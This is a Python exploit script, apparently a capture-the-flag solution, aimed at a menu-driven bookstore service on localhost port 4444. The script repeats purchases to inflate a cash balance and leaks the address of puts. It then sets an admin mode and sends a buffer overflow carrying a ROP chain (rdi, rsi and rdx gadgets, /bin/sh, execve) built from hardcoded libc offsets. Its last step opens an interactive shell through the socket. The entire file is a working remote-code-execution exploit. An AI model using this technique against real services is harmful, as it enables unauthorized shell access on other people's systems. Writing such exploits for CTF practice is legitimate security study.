# imports
import socket
import time




# offsets from puts
bin_sh_offset = 0x12054f
rdi_gadget_offset = -0x4de9b
rsi_gadget_offset = -0x4c6e7
rdx_gadget_offset = 0x87b8d
execve_offset = 0x5e560




# read the data back from the socket until we get the '>> ' from the server
def read_input(s):
    total = b''
    while True:
        buffer = s.recv(1)
        if not buffer:
            break
        if len(buffer) == 0:
            break
        total += buffer
        if '>> ' in total.decode('utf-8'):
            break
    return total




# list of commands to send to the server
commands = [
    b'2\n', b'2\n', b'y\n',    # buy books until cash gets big number
    b'2\n', b'2\n', b'y\n',
    b'2\n', b'2\n', b'y\n',
    b'2\n', b'2\n', b'y\n',
    b'2\n', b'2\n', b'y\n',
    b'2\n', b'2\n', b'y\n',
    b'2\n', b'2\n', b'y\n',
    b'2\n', b'2\n', b'y\n',

    b'2\n', b'3\n', b'y\n',    # get puts address

    b'1\n', b'y\n', b'12345678901234567890123456789012345678\n', # set admin mode

    b'3\n'                   # prepare to write ROP chain
]

# open socket to target server
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(('127.0.0.1', 4444))

# loop while sending and receiving
while True:
    # receive from server
    message = read_input(client_socket).decode('utf-8')
    print(message)

    # look if the message contains the puts address
    index = message.find('in all it\'s glory ')
    if index != -1:
        # extract puts address
        index = message.find('0x', index)
        end_index = message.find(' ', index)
        puts_address = int(message[index : end_index], 16)

        # calculate addresses
        bin_sh_address = puts_address + bin_sh_offset
        rdi_gadget_address = puts_address + rdi_gadget_offset
        rsi_gadget_address = puts_address + rsi_gadget_offset
        rdx_gadget_address = puts_address + rdx_gadget_offset
        execve_address = puts_address + execve_offset

        # add to the list of things to send, this is the buffer overflow in the adminBook function
        # thats sets up the ROP chain
        zero = 0
        to_send = b''
        to_send += b'12345678901234567890123456789012345678901234567890123456'
        to_send += rdi_gadget_address.to_bytes(8, byteorder='little')
        to_send += bin_sh_address.to_bytes(8, byteorder='little')
        to_send += rsi_gadget_address.to_bytes(8, byteorder='little')
        to_send += zero.to_bytes(8, byteorder='little')
        to_send += rdx_gadget_address.to_bytes(8, byteorder='little')
        to_send += zero.to_bytes(8, byteorder='little')
        to_send += execve_address.to_bytes(8, byteorder='little')
        to_send += b'\n'
        commands.append(to_send)

    # make sure we have a command to send
    if len(commands) == 0:
        break

    # sending 
    print(f'sending: {commands[0]}')
    client_socket.send(commands[0])
    commands = commands[1:]

    # slow it down a little so we can read the text going by
    time.sleep(0.1)

    # recheck if any other commands
    if len(commands) == 0:
        break


# final unimportant message from server
message = client_socket.recv(1024).decode('utf-8')

# out of commands so should be at the /bin/sh prompt
while True:
    # command to execute
    command = input('enter command> ') + '\n'

    # if it is 'exit' then quit the program
    if 'exit' in command:
        break

    # send command to server
    client_socket.send(command.encode('utf-8'))

    # get it's response
    # note that if we expected really big responses or other network conditions
    # where we may not get all the data at once, we should put this in a loop
    # but this works fine for our use case
    message = client_socket.recv(1024).decode('utf-8')

    # show the resposne
    print(message)

# all done
client_socket.close()


